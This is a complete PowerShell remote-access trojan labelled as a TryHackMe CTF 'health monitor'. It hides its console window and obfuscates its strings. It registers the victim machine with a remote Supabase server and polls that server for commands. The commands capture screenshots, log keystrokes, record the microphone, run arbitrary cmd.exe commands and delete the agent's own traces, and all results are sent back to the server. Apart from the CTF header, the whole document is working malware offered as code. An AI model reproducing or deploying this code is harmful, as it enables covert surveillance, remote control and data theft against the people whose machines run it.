# ======================================
# OBFUSCATED HEALTH MONITOR - THM CTF
# ======================================

# Obfuscation: Variable name randomization
${_0x1a2b} = "SilentlyContinue"
$ErrorActionPreference = ${_0x1a2b}
$ProgressPreference = ${_0x1a2b}

# Obfuscation: Hide console using encoded strings
${_k32} = [char]75+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]46+[char]100+[char]108+[char]108
${_u32} = [char]117+[char]115+[char]101+[char]114+[char]51+[char]50+[char]46+[char]100+[char]108+[char]108
try {
    ${_def} = '[DllImport("'+${_k32}+'")]public static extern IntPtr GetConsoleWindow();[DllImport("'+${_u32}+'")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    Add-Type -Name ([char]87+[char]105+[char]110) -Namespace ([char]78+[char]97+[char]116) -MemberDefinition ${_def}
    [Nat.Win]::ShowWindow([Nat.Win]::GetConsoleWindow(), 0)
} catch {}

# Obfuscation: Path using char codes
${_bp} = -join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101)

# Wait for network
${_dns} = "8.8.8.8"
while (!(&([char]84+[char]101+[char]115+[char]116+[char]45+[char]67+[char]111+[char]110+[char]110+[char]101+[char]99+[char]116+[char]105+[char]111+[char]110) -ComputerName ${_dns} -Count 1 -Quiet)) {
    Start-Sleep 5
}
Start-Sleep 5

# Load config
${_cfg} = Get-Content "${_bp}\config.json" -Raw | ConvertFrom-Json
${_did_f} = "${_bp}\device_id.txt"

# Device ID
if (Test-Path ${_did_f}) {
    ${_did} = (Get-Content ${_did_f} -Raw).Trim()
} else {
    ${_did} = [guid]::NewGuid().ToString()
    ${_did} | Out-File ${_did_f} -NoNewline
    (Get-Item ${_did_f}).Attributes = "Hidden"
}

# Random name
${_dn} = -join ((65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })

# Headers
${_h} = @{
    "apikey" = ${_cfg}.supabase_key
    "Authorization" = "Bearer $(${_cfg}.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

# API Function (obfuscated name)
function Invoke-0x8F3 {
    param($ep, $mt = "GET", $bd = $null)
    ${_u} = "$(${_cfg}.supabase_url)/rest/v1/$ep"
    try {
        if ($bd) {
            Invoke-RestMethod -Uri ${_u} -Method $mt -Headers ${_h} -Body ($bd | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
        } else {
            Invoke-RestMethod -Uri ${_u} -Method $mt -Headers ${_h} -TimeoutSec 30
        }
    } catch { $null }
}

# Register
${_rd} = @{
    device_id = ${_did}
    device_name = ${_dn}
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
}
Invoke-0x8F3 -ep "devices" -mt "POST" -bd ${_rd}

# Screenshot (obfuscated)
function Get-0xA1B {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        ${_s} = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        ${_b} = New-Object System.Drawing.Bitmap(${_s}.Width, ${_s}.Height)
        ${_g} = [System.Drawing.Graphics]::FromImage(${_b})
        ${_g}.CopyFromScreen(${_s}.Location, [System.Drawing.Point]::Empty, ${_s}.Size)
        ${_ms} = New-Object System.IO.MemoryStream
        ${_b}.Save(${_ms}, [System.Drawing.Imaging.ImageFormat]::Png)
        ${_g}.Dispose(); ${_b}.Dispose()
        ${_r} = [Convert]::ToBase64String(${_ms}.ToArray())
        ${_ms}.Dispose()
        return @{ data_type = "screenshot"; file_data = ${_r} }
    } catch { return @{ data_type = "error"; data = $_.Exception.Message } }
}

# Keylogger (obfuscated)
$Global:_kl = [System.Collections.ArrayList]::new()
$Global:_ki = $null

function Start-0xB2C {
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class K0x1 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
        $Global:_ki = Register-EngineEvent -SourceIdentifier ([guid]::NewGuid().ToString()) -Action {
            for ($i = 8; $i -le 255; $i++) {
                if ([K0x1]::GetAsyncKeyState($i) -eq -32767) {
                    $c = [char]$i
                    if ($i -ge 65 -and $i -le 90 -and !([Console]::CapsLock)) {
                        $c = [char]($i + 32)
                    }
                    $Global:_kl.Add($c)
                }
            }
        }
        return $true
    } catch { return $false }
}

function Get-0xC3D {
    param($dur = 60)
    try {
        Start-0xB2C
        Start-Sleep $dur
        if ($Global:_ki) { Unregister-Event -SubscriptionId $Global:_ki.Id -ErrorAction SilentlyContinue }
        ${_d} = -join $Global:_kl
        $Global:_kl.Clear()
        return @{ data_type = "input"; data = if(${_d}){"$((Get-Date).ToString('HH:mm:ss')): ${_d}"}else{"[No keys]"} }
    } catch { return @{ data_type = "error"; data = $_.Exception.Message } }
}

# System Info (obfuscated)
function Get-0xD4E {
    try {
        ${_os} = Get-CimInstance Win32_OperatingSystem
        ${_cs} = Get-CimInstance Win32_ComputerSystem
        ${_p} = Get-CimInstance Win32_Processor
        ${_i} = @{
            OS = ${_os}.Caption
            Version = ${_os}.Version
            Arch = ${_os}.OSArchitecture
            Hostname = $env:COMPUTERNAME
            User = $env:USERNAME
            Domain = $env:USERDOMAIN
            CPU = ${_p}.Name
            RAM = "$([math]::Round(${_cs}.TotalPhysicalMemory/1GB,2)) GB"
            LastBoot = ${_os}.LastBootUpTime.ToString()
            Uptime = ((Get-Date) - ${_os}.LastBootUpTime).ToString("dd\.hh\:mm\:ss")
        }
        return @{ data_type = "sysinfo"; data = (${_i} | ConvertTo-Json -Compress) }
    } catch { return @{ data_type = "error"; data = $_.Exception.Message } }
}

# Audio (obfuscated)
function Get-0xE5F {
    param($dur = 10)
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class A0x1 {
    [DllImport("winmm.dll")]
    public static extern int mciSendString(string c, System.Text.StringBuilder r, int l, IntPtr h);
}
"@
        ${_f} = [System.IO.Path]::GetTempFileName() -replace '\.tmp$','.wav'
        [A0x1]::mciSendString("open new type waveaudio alias r0x", $null, 0, 0)
        [A0x1]::mciSendString("record r0x", $null, 0, 0)
        Start-Sleep $dur
        [A0x1]::mciSendString("stop r0x", $null, 0, 0)
        [A0x1]::mciSendString("save r0x `"${_f}`"", $null, 0, 0)
        [A0x1]::mciSendString("close r0x", $null, 0, 0)
        if (Test-Path ${_f}) {
            ${_b} = [Convert]::ToBase64String([IO.File]::ReadAllBytes(${_f}))
            Remove-Item ${_f} -Force
            return @{ data_type = "audio"; file_data = ${_b} }
        }
        return @{ data_type = "error"; data = "Recording failed" }
    } catch { return @{ data_type = "error"; data = $_.Exception.Message } }
}

# Command Exec (obfuscated)
function Invoke-0xF6G {
    param($c)
    try {
        ${_o} = & cmd.exe /c $c 2>&1
        return @{
            data_type = "cmd_result"
            data = (@{ command=$c; output=${_o}; exit_code=$LASTEXITCODE; executed_as="USER" } | ConvertTo-Json -Compress)
        }
    } catch { return @{ data_type = "cmd_result"; data = (@{ command=$c; error=$_.Exception.Message } | ConvertTo-Json -Compress) } }
}

# Self Destruct (obfuscated)
function Remove-0xG7H {
    try {
        Unregister-ScheduledTask -TaskName "SystemHealthMonitor" -Confirm:$false -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName "SystemHealthAdmin" -Confirm:$false -ErrorAction SilentlyContinue
        Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep 2
        Remove-Item ${_bp} -Recurse -Force -ErrorAction SilentlyContinue
        return @{ data_type = "sysinfo"; data = "Agent destroyed" }
    } catch { return @{ data_type = "error"; data = $_.Exception.Message } }
}

# Main Loop
${_si} = if (${_cfg}.sync_interval) { ${_cfg}.sync_interval } else { 10 }
${_ri} = if (${_cfg}.retry_interval) { ${_cfg}.retry_interval } else { 10 }
${_lt} = Get-Date
${_tt} = @("screenshot","input_monitor","system_info","voice_capture","cmd_exec","auto_destruct","restart_agent")

while ($true) {
    try {
        ${_now} = Get-Date
        if ((${_now} - ${_lt}).TotalSeconds -ge 60) {
            Invoke-0x8F3 -ep "devices?device_id=eq.${_did}" -mt "PATCH" -bd @{ last_seen = ${_now}.ToString("o") }
            ${_lt} = ${_now}
        }
        ${_tl} = Invoke-0x8F3 -ep "tasks?device_id=eq.${_did}&status=eq.pending&task_type=in.($(${_tt} -join ','))&order=created_at.asc&limit=5"
        if (${_tl}) {
            foreach (${_t} in ${_tl}) {
                Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{ status = "processing" }
                ${_tr} = $null
                switch (${_t}.task_type) {
                    "screenshot" { ${_tr} = Get-0xA1B }
                    "input_monitor" {
                        ${_d} = 60
                        if (${_t}.task_params -and ${_t}.task_params.duration) { ${_d} = [int]${_t}.task_params.duration }
                        if (${_d} -gt 300) { ${_d} = 300 }
                        ${_tr} = Get-0xC3D -dur ${_d}
                    }
                    "system_info" { ${_tr} = Get-0xD4E }
                    "voice_capture" {
                        ${_d} = 10
                        if (${_t}.task_params -and ${_t}.task_params.duration) { ${_d} = [int]${_t}.task_params.duration }
                        if (${_d} -gt 120) { ${_d} = 120 }
                        ${_tr} = Get-0xE5F -dur ${_d}
                    }
                    "cmd_exec" {
                        ${_c} = ""
                        if (${_t}.task_params -and ${_t}.task_params.command) { ${_c} = ${_t}.task_params.command }
                        if (${_c}) { ${_tr} = Invoke-0xF6G -c ${_c} }
                        else { ${_tr} = @{ data_type = "cmd_result"; data = "No command" } }
                    }
                    "auto_destruct" {
                        ${_tr} = Remove-0xG7H
                        Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{ device_id = ${_did}; data_type = ${_tr}.data_type; data = ${_tr}.data }
                        Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{ status = "complete"; completed_at = (Get-Date -Format "o") }
                        exit 0
                    }
                    "restart_agent" {
                        Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{ status = "complete"; completed_at = (Get-Date -Format "o") }
                        Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{ device_id = ${_did}; data_type = "sysinfo"; data = "Restarting..." }
                        try {
                            Stop-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Stop-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                        } catch {}
                        exit 0
                    }
                    default { ${_tr} = @{ data_type = "error"; data = "Unknown: $(${_t}.task_type)" } }
                }
                if (${_tr}) {
                    ${_td} = @{ device_id = ${_did}; data_type = ${_tr}.data_type }
                    if (${_tr}.data) { ${_td}.data = ${_tr}.data }
                    if (${_tr}.file_data) { ${_td}.file_data = ${_tr}.file_data }
                    Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd ${_td}
                    Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{ status = "complete"; completed_at = (Get-Date -Format "o") }
                }
            }
        }
    } catch {}
    Start-Sleep ${_si}
}
